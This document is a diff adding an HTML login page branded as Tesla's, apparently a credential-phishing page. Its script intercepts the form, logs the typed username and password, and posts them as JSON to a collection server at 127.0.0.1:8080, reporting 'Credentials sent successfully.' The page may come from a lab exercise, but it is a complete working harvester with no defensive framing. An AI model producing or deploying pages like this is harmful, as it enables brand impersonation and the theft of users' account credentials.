@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tesla Login</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+    <style>
+        body {
+            background-color: #f8f9fa;
+        }
+        .card {
+            border: none;
+            border-radius: 10px;
+            box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.1);
+        }
+        .card-body {
+            padding: 40px;
+        }
+        .form-group {
+            margin-bottom: 30px;
+        }
+        .btn-primary {
+            background-color: #f0324b;
+            border: none;
+        }
+        .btn-primary:hover {
+            background-color: #dc3545;
+        }
+    </style>
+</head>
+<body>
+    <div class="container-fluid">
+        <div class="row justify-content-center align-items-center vh-100">
+            <div class="col-md-4">
+                <div class="card">
+                    <div class="card-body">
+                        <div class="text-center mb-4">
+                            <img src="../assets/image/tesla_logo.jpg" alt="Tesla Logo" style="max-width: 100px;">
+                        </div>
+                        <h2 class="card-title text-center mb-4">Sign In</h2>
+                        <form action="#" method="POST" id="loginForm">
+                            <div class="form-group">
+                                <label for="usuario"><i class="fab fa-tesla"></i> Username:</label>
+                                <input type="text" id="usuario" name="usuario" class="form-control" required>
+                            </div>
+     
+                            <div class="form-group">
+                                <label for="contrasena"><i class="fas fa-charging-station"></i> Password:</label>
+                                <input type="password" id="contrasena" name="contrasena" class="form-control" required>
+                            </div>
+     
+                            <div class="form-group text-center">
+                                <button type="submit" class="btn btn-primary btn-block" id="submitButton"><i class="fas fa-power-off"></i> Sign In</button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+ 
+    <!-- Bootstrap and FontAwesome Scripts -->
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            document.getElementById("loginForm").addEventListener("submit", function(event) {
+                event.preventDefault(); // Prevent form submission
+
+                // Disable submit button to prevent multiple submissions
+                document.getElementById("submitButton").disabled = true;
+
+                // Get form values
+                var username = document.getElementById("usuario").value;
+                var password = document.getElementById("contrasena").value;
+
+                // Create data object
+                var data = {
+                    username: username,
+                    password: password
+                };
+
+                console.log(data);
+
+                // Convert data to JSON format
+                var jsonData = JSON.stringify(data);
+
+                // Setup HTTP request
+                var xhttp = new XMLHttpRequest();
+                xhttp.onreadystatechange = function() {
+                    if (this.readyState == 4) {
+                        // Enable submit button after request completion
+                        document.getElementById("submitButton").disabled = false;
+
+                        if (this.status == 200) {
+                            // Handle response
+                            console.log("Credentials sent successfully.");
+                        } else {
+                            console.log("Error sending credentials to server.");
+                        }
+                    }
+                };
+                xhttp.open("POST", "http://127.0.0.1:8080", true);
+                xhttp.setRequestHeader("Content-type", "application/json");
+                xhttp.send(jsonData);
+            });
+        });
+    </script>
+</body>
+</html>
